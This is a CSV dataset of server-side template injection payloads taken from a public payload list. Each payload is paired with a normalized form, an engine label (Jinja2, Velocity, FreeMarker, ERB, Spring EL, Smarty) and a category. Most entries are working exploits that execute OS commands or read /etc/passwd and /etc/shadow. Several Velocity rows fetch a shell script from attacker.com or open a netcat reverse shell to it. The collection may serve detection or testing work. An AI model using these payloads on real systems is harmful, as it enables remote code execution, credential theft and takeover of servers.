{{''.__class__}}${T(java.lang.String)}<%= ''.class %>,{{'S'.__class__}}${t(java.lang.string)}<%='S'.class%>,multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{request.application}}${applicationScope}<%= defined?(Rails) %>,{{request.application}}${applicationscope}<%=defined?(rails)%>,multi,unknown,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{%for c in [].__class__.__base__.__subclasses__()%}{{c}}{%endfor%},{%forcin[].__class__.__base__.__subclasses__()%}{{c}}{%endfor%},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))$rt,#set($x='S')#set($rt=$x.class.forname('S'))$rt,multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{lipsum.__globals__.os}},{{lipsum.__globals__.os}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.System)},${t(java.lang.system)},multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= IO %>,<%=io%>,multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${@environment},${@environment},multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}$_SERVER{/php},{php}$_server{/php},multi,unknown,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{url_for.__globals__}},{{url_for.__globals__}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${{#request}},${{#request}},multi,unknown,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= request %>,<%=request%>,multi,unknown,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= Open3.capture2('id') %>,<%=openN.captureN('S')%>,multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"{php}exec('id',$output);print_r($output);{/php}","{php}exec('S',$output);print_r($output);{/php}",multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('cat${IFS}/etc/passwd')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= `cat${IFS}/etc/passwd` %>,<%=`cat${ifs}/etc/passwd`%>,multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}},{{cycler|attr('S')|attr('S')}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""cat$IFS/etc/passwd"")}","${""S""?new()(""S"")}",multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{''.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}},{{'S'.__class__.__bases__[N].__subclasses__()[N]('S').read()}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\Z').next()},${newjava.util.scanner(newjava.io.file('S')).usedelimiter('S').next()},multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}readfile('/etc/passwd');{/php},{php}readfile('S');{/php},multi,unknown,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""calc"")}","${""S""?new()(""S"")}",multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"#set($runtime=$class.inspect(""java.lang.Runtime"").type)#set($process=$runtime.getRuntime().exec(""calc""))","#set($runtime=$class.inspect(""S"").type)#set($process=$runtime.getruntime().exec(""S""))",multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= `calc` rescue `open /Applications/Calculator.app` %>,<%=`calc`rescue`open/applications/calculator.app`%>,multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*7}}{{7*'7'}}{{config}}{{self}},{{N*N}}{{N*'S'}}{{config}}{{self}},multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${{7*7}}${7*7}${_self}${app},${{N*N}}${N*N}${_self}${app},multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= 7*7 %><%= '7'*7 %><%= self %>,<%=N*N%><%='S'*N%><%=self%>,multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
#set($x=7*7)$x,#set($x=N*N)$x,multi,unknown,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{request.application.__globals__.__builtins__.__import__('os')}},{{request.application.__globals__.__builtins__.__import__('S')}},multi,unknown,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime)},${t(java.lang.runtime)},multi,unknown,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
<%= require 'open3' %>,<%=require'S'%>,multi,unknown,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{php}dl('suhosin.so');{/php},{php}dl('S');{/php},multi,unknown,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
#set($x=7*'7'),#set($x=N*'S'),java,Velocity,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($runtime=$class.inspect(""java.lang.Runtime"").type)","#set($runtime=$class.inspect(""S"").type)",java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""id""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""whoami""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""cat /etc/passwd""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""ls -la""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""uname -a""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""pwd""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""env""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""cat flag.txt""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""ps aux""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""ifconfig""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""netstat -an""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""cat /etc/shadow""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($s="""")","#set($s=""S"")",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($stringClass=$s.getClass()),#set($stringclass=$s.getclass()),java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($runtime=$stringClass.forName(""java.lang.Runtime"").getRuntime())","#set($runtime=$stringclass.forname(""S"").getruntime())",java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.exec(""id""))","#set($process=$runtime.exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.exec(""whoami""))","#set($process=$runtime.exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.exec(""cat /etc/passwd""))","#set($process=$runtime.exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.exec(""ls -la""))","#set($process=$runtime.exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.exec(""uname -a""))","#set($process=$runtime.exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($str=$class.inspect(""java.lang.String"").type)","#set($str=$class.inspect(""S"").type)",java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($chr=$class.inspect(""java.lang.Character"").type)","#set($chr=$class.inspect(""S"").type)",java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($runtime=$str.forName(""java.lang.Runtime""))","#set($runtime=$str.forname(""S""))",java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($x=''),#set($x='S'),java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($rt=$x.class.forName('java.lang.Runtime')),#set($rt=$x.class.forname('S')),java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($chr=$x.class.forName('java.lang.Character')),#set($chr=$x.class.forname('S')),java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($str=$x.class.forName('java.lang.String')),#set($str=$x.class.forname('S')),java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('id')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('whoami')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('cat /etc/passwd')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('ls -la')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('uname -a')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('pwd')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('env')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('cat flag.txt')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($pb=$class.inspect(""java.lang.ProcessBuilder"").type)","#set($pb=$class.inspect(""S"").type)",java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""id""])","#set($arr=[""S""])",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($process=$pb.newInstance($arr).start()),#set($process=$pb.newinstance($arr).start()),java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""whoami""])","#set($arr=[""S""])",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""cat"",""/etc/passwd""])","#set($arr=[""S"",""S""])",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""ls"",""-la""])","#set($arr=[""S"",""S""])",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""uname"",""-a""])","#set($arr=[""S"",""S""])",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""bash"",""-c"",""id""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""sh"",""-c"",""id""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""/bin/sh"",""-c"",""id""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""/bin/bash"",""-c"",""id""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($file=$class.inspect(""java.io.File"").type)","#set($file=$class.inspect(""S"").type)",java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($obj=$file.newInstance(""/etc/passwd""))","#set($obj=$file.newinstance(""S""))",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($obj=$file.newInstance(""/""))","#set($obj=$file.newinstance(""S""))",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($obj=$file.newInstance("".""))","#set($obj=$file.newinstance(""S""))",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($scanner=$class.inspect(""java.util.Scanner"").type)","#set($scanner=$class.inspect(""S"").type)",java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($fileObj=$file.newInstance(""/etc/passwd""))","#set($fileobj=$file.newinstance(""S""))",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($scannerObj=$scanner.newInstance($fileObj).useDelimiter(""\\Z""))","#set($scannerobj=$scanner.newinstance($fileobj).usedelimiter(""S""))",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($fileObj=$file.newInstance(""flag.txt""))","#set($fileobj=$file.newinstance(""S""))",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""touch /tmp/pwned""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""wget http://attacker.com/shell.sh -O /tmp/shell.sh""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""curl http://attacker.com/shell.sh -o /tmp/shell.sh""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""nc attacker.com 4444 -e /bin/bash""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('cat${IFS}/etc/passwd')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('cat$IFS/etc/passwd')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""sh"",""-c"",""cat</etc/passwd""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""sh"",""-c"",""cat<flag.txt""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""calc""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""cmd /c calc""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""cmd /c dir""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""powershell.exe""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""cmd.exe /c whoami""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""cmd"",""/c"",""whoami""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""powershell"",""-c"",""whoami""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($input=$process.getInputStream()),#set($input=$process.getinputstream()),java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($scannerObj=$scanner.newInstance($input).useDelimiter(""\\A""))","#set($scannerobj=$scanner.newinstance($input).usedelimiter(""S""))",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($scannerObj=$scanner.newInstance($input).useDelimiter(""\\Z""))","#set($scannerobj=$scanner.newinstance($input).usedelimiter(""S""))",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($inetAddress=$class.inspect(""java.net.InetAddress"").type)","#set($inetaddress=$class.inspect(""S"").type)",java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($thread=$class.inspect(""java.lang.Thread"").type)","#set($thread=$class.inspect(""S"").type)",java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($bufferedReader=$class.inspect(""java.io.BufferedReader"").type)","#set($bufferedreader=$class.inspect(""S"").type)",java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($fileReader=$class.inspect(""java.io.FileReader"").type)","#set($filereader=$class.inspect(""S"").type)",java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($fr=$fileReader.newInstance(""/etc/passwd""))","#set($fr=$filereader.newinstance(""S""))",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($br=$bufferedReader.newInstance($fr)),#set($br=$bufferedreader.newinstance($fr)),java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($fr=$fileReader.newInstance(""flag.txt""))","#set($fr=$filereader.newinstance(""S""))",java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($inputStreamReader=$class.inspect(""java.io.InputStreamReader"").type)","#set($inputstreamreader=$class.inspect(""S"").type)",java,Velocity,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($isr=$inputStreamReader.newInstance($process.getInputStream())),#set($isr=$inputstreamreader.newinstance($process.getinputstream())),java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
